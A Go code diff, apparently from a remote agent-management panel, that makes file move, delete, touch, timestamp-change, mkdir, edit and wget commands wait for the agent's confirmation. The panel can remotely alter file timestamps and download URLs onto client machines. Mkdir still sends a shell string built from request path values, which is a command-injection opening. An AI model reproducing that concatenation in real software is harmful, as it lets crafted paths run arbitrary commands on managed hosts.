@@ -76,6 +76,30 @@ func (c *FileController) dispatchOrReport(id int64, cmd string) bool {
 	return true
 }
 
+// fileOpTimeout 是"有副作用的文件操作"等待 agent 确认的上限。
+const fileOpTimeout = 15 * time.Second
+
+// dispatchAndWait 下发命令并**等待 agent 确认执行结果**。
+//
+// 为什么：dispatchCmd 只负责投递，投递成功并不代表目标机执行成功（例如同一个 vkey
+// 上跑了重复 agent 时，任务可能被别的进程取走而没人执行）。写文件/删除/重命名这类
+// 有副作用的操作必须等到结果，否则面板会出现"save success 但文件没变"。
+//
+// 返回 (out, "") 表示成功；返回 ("", errMsg) 表示失败（errMsg 来自 agent 或超时）。
+func (c *FileController) dispatchAndWait(id int64, cmd string, timeout time.Duration) (string, string) {
+	return engineRunCmd(id, cmd, timeout)
+}
+
+// okOrErr 根据等待结果回包：成功谈 JsonOkVerb，失败回 JsonErr。
+func (c *FileController) okOrErr(verb, out, errMsg string) bool {
+	if errMsg != "" {
+		c.JsonErr(errMsg)
+		return false
+	}
+	c.JsonOkVerb(verb)
+	return true
+}
+
 // Getdisk 列出客户端磁盘（POST /file/getdisk）。参数：id。
 func (c *FileController) Getdisk() {
 	id := c.clientID()
@@ -141,10 +165,10 @@ func (c *FileController) Mv() {
 		return
 	}
 	req, _ := json.Marshal(map[string]string{"type": "filemove", "src": src, "dst": dst})
-	if !c.dispatchOrReport(id, string(req)) {
+	out, errMsg := c.dispatchAndWait(id, string(req), fileOpTimeout)
+	if !c.okOrErr("ok", out, errMsg) {
 		return
 	}
-	c.JsonOkMessage("ok")
 }
 
 // Rm 删除文件（POST /file/rm）。参数：id / path。
@@ -157,10 +181,10 @@ func (c *FileController) Rm() {
 	}
 	// JSON 命令（agent 的 CmdFileDelete）：文本 "rm <path>" 没有解析器会落进 shell。
 	req, _ := json.Marshal(map[string]string{"type": "filedelete", "path": path})
-	if !c.dispatchOrReport(id, string(req)) {
+	out, errMsg := c.dispatchAndWait(id, string(req), fileOpTimeout)
+	if !c.okOrErr("ok", out, errMsg) {
 		return
 	}
-	c.JsonOkMessage("ok")
 }
 
 // RmList 批量删除（POST /file/rmlist）。参数：id / path / name（多文件以 "|<-" 分隔）。
@@ -218,10 +242,10 @@ func (c *FileController) Touch() {
 		return
 	}
 	req, _ := json.Marshal(map[string]string{"type": "filetouch", "path": joinPath(path, target)})
-	if !c.dispatchOrReport(id, string(req)) {
+	out, errMsg := c.dispatchAndWait(id, string(req), fileOpTimeout)
+	if !c.okOrErr("ok", out, errMsg) {
 		return
 	}
-	c.JsonOkMessage("ok")
 }
 
 // Modifytime 修改文件时间戳（POST /file/modifytime）。参数：id / path / time / target。
@@ -239,10 +263,10 @@ func (c *FileController) Modifytime() {
 		"path": joinPath(path, target),
 		"time": t, // RFC3339 或 "YYYY-MM-DD HH:MM:SS"
 	})
-	if !c.dispatchOrReport(id, string(req)) {
+	out, errMsg := c.dispatchAndWait(id, string(req), fileOpTimeout)
+	if !c.okOrErr("ok", out, errMsg) {
 		return
 	}
-	c.JsonOkMessage("ok")
 }
 
 // Mkdir 创建目录（POST /file/mkdir）。参数：id / path / target。
@@ -254,10 +278,10 @@ func (c *FileController) Mkdir() {
 		c.JsonErr("id error")
 		return
 	}
-	if !c.dispatchOrReport(id, "mkdir -p "+joinPath(path, target)) {
+	out, errMsg := c.dispatchAndWait(id, "mkdir -p "+joinPath(path, target), fileOpTimeout)
+	if !c.okOrErr("ok", out, errMsg) {
 		return
 	}
-	c.JsonOkMessage("ok")
 }
 
 // Edit 编辑文件内容（POST /file/edit）。参数：id / path / target。
@@ -275,10 +299,8 @@ func (c *FileController) Edit() {
 		"path":    joinPath(path, target),
 		"content": content,
 	})
-	if !c.dispatchOrReport(id, string(req)) {
-		return
-	}
-	c.JsonOkVerb("save")
+	out, errMsg := c.dispatchAndWait(id, string(req), fileOpTimeout)
+	c.okOrErr("save", out, errMsg)
 }
 
 // Wget 远程下载到客户端（POST /file/wget）。参数：id / path / target。
@@ -301,10 +323,10 @@ func (c *FileController) Wget() {
 		dst = fileNameFromURL(url)
 	}
 	req, _ := json.Marshal(map[string]string{"type": "wget", "url": url, "dst": dst})
-	if !c.dispatchOrReport(id, string(req)) {
+	out, errMsg := c.dispatchAndWait(id, string(req), fileOpTimeout)
+	if !c.okOrErr("ok", out, errMsg) {
 		return
 	}
-	c.JsonOkMessage("ok")
 }
 
 // Upload 上传文件到客户端（POST /file/upload）。参数：id / path / file / url。
